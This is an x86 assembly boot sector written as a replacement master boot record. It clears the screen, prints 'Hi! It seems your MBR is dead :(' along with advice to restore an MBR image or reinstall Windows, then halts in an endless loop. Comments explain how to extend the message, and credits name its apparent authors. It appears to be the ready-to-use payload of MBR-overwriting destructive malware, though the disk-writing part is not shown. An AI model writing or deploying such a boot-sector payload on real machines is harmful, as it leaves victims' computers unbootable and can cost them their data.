[org 0x7C00]

start:
    ; Screen clear
    mov ax, 0x0700
    mov bh, 0x07
    mov cx, 0x0000
    mov dx, 0x184F
    int 0x10

    ; Change cursor position
    mov ah, 0x02
    mov bh, 0x00
    mov dx, 0x0000
    int 0x10

    ; First line output
    mov si, message1
    call print_string

   ; Change cursor position
    mov ah, 0x02
    mov bh, 0x00
    mov dx, 0x0100
    int 0x10

    ; Second line output
    mov si, message2
    call print_string

    ; Change cursor position
    mov ah, 0x02
    mov bh, 0x00
    mov dx, 0x0200
    int 0x10

    ; Third line output
    mov si, message3
    call print_string

    ; Change cursor position
    mov ah, 0x02
    mov bh, 0x00
    mov dx, 0x0300
    int 0x10

    ; Fourth line output
    mov si, message4
    call print_string
	
	; for add more lines add to the cursor "dx" 100
	; and write this
	
	; mov si, message5
    ; call print_string
	;mov ah, 0x02
    ;mov bh, 0x00
    ;mov dx, 0x0400
    ;int 0x10
	; Cursor change example
	
    ; Infinity cycle
	; And it's killing MBR
    jmp $

print_string:
    lodsb
    or al, al
    jz done
    mov ah, 0x0E
    mov bh, 0x00
    int 0x10
    jmp print_string

done:
    ret

message1 db 'Hi! It seems your MBR is dead :(', 0
message2 db 'I am sorry, but you need an MBR image to restore', 0
message3 db 'Well, or reinstall Windows', 0
message4 db '	Orig. image by Ametero | Extended by CanaryGen', 0
;message5 db 'Check line 51', 0

times 510 - ($ - $$) db 0
dw 0xAA55